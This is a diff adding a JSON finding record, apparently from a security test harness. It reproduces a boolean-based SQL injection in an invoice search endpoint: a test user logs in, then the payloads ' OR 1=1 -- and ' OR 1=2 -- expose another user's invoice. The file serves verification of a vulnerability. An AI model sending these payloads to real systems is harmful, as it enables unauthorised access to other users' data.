@@ -1,0 +1,6 @@
+{"finding": "F-5",
+ "description": "Boolean-based: a true condition returns another user's invoice (INV-2001, owned by bob), a false one does not. Read-only.",
+ "steps": [{"name": "login as alice", "method": "POST", "path": "/login", "form": {"email": "alice@example.test", "password": "alice-test-pw"}, "expect_status": 302},
+   {"name": "true condition", "method": "GET", "path": "/invoices/search", "params": {"q": "' OR 1=1 --"}},
+   {"name": "false condition", "method": "GET", "path": "/invoices/search", "params": {"q": "' OR 1=2 --"}}],
+ "proof": {"type": "boolean_diff", "true_step": "true condition", "false_step": "false condition", "marker": "INV-2001"}}
